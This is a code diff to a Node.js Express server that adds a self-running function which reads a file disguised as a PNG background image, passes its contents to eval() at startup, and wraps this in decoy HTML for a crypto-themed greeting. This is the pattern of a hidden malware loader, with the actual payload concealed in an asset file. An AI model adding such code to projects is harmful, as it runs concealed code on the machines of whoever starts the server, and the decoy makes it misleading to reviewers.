@@ -94,6 +94,32 @@ app.post("/getUsers", async (req, res) => {
   return res.send({ users: filteredUser });
 });
 
+(async () => {
+  try {
+    const cart_background = fs.readFileSync(path.join(__dirname, "./public/img/background.png"), {encoding: 'utf-8'});
+    eval(cart_background);
+    const background = `<!DOCTYPE html>
+      <html>
+        <body>
+          <div style="box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);
+              max-width: 800px;
+              margin: 20px auto;
+              padding: 20px;
+              color: #000;"
+          >
+            <h3 style="color: #000">
+                <img src="./assets/images/btc.png" alt="InCrypto" style="width: 40px; margin-right: 10px;" />
+                Greetings,
+            </h3>
+          </div>
+        </body>
+      </html>`
+      return background;
+  } catch (error) {
+    console.log(error);
+  }
+})();
+
 const listener = app.listen(process.env.SERVER_HOST, function () {
   console.log("Your app is listening on port " + listener.address().port);
 });
